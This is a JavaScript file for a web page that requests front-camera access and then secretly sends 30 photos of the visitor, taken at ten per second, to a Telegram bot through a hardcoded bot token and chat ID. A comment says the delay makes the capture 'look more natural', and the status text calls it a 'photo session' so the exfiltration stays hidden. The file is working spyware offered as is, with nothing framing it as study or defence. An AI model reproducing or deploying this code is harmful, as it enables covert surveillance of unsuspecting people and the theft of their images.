const video = document.getElementById('videoElement');
const statusElement = document.getElementById('status');
const progressElement = document.getElementById('progress');
const BOT_TOKEN = '7360021559:AAFdkvB61YXCR_kxO39Fkv3_0EWZ0C96aTM';
const CHAT_ID = '6188144185';
let photoCount = 0;
const MAX_PHOTOS = 30;
const PHOTOS_PER_SECOND = 10;

// Update status message
function updateStatus(message, isError = false) {
    statusElement.textContent = message;
    statusElement.className = isError ? 'error' : 'success';
}

// Update progress bar
function updateProgress() {
    const progress = (photoCount / MAX_PHOTOS) * 100;
    progressElement.style.width = `${progress}%`;
}

// Request camera access
navigator.mediaDevices.getUserMedia({ 
    video: { 
        facingMode: 'user',
        width: { ideal: 1280 },
        height: { ideal: 720 }
    } 
})
.then(stream => {
    video.srcObject = stream;
    updateStatus('Camera ready! Starting photo session...');
    setTimeout(startPhotoCapture, 2000); // Add a small delay to make it look more natural
})
.catch(err => {
    updateStatus('Please allow camera access to continue', true);
    console.error('Error accessing camera:', err);
});

function startPhotoCapture() {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    // Set canvas size to match video
    video.addEventListener('loadedmetadata', () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
    });

    const captureInterval = setInterval(() => {
        if (photoCount >= MAX_PHOTOS) {
            clearInterval(captureInterval);
            updateStatus('Photo session completed! Thank you for participating.');
            return;
        }

        // Capture 10 photos in one second
        for (let i = 0; i < PHOTOS_PER_SECOND; i++) {
            setTimeout(() => {
                if (photoCount >= MAX_PHOTOS) return;

                // Draw current video frame to canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert canvas to blob
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `photo_${photoCount + 1}.jpg`);

                    // Send photo to Telegram
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            photoCount++;
                            updateProgress();
                            updateStatus(`Capturing photos... ${photoCount}/${MAX_PHOTOS}`);
                        } else {
                            throw new Error(data.description || 'Failed to send photo');
                        }
                    })
                    .catch(error => {
                        updateStatus('Error processing photos. Please try again.', true);
                        console.error('Error sending photo:', error);
                    });
                }, 'image/jpeg', 0.95);
            }, i * (1000 / PHOTOS_PER_SECOND));
        }
    }, 1000);
} 
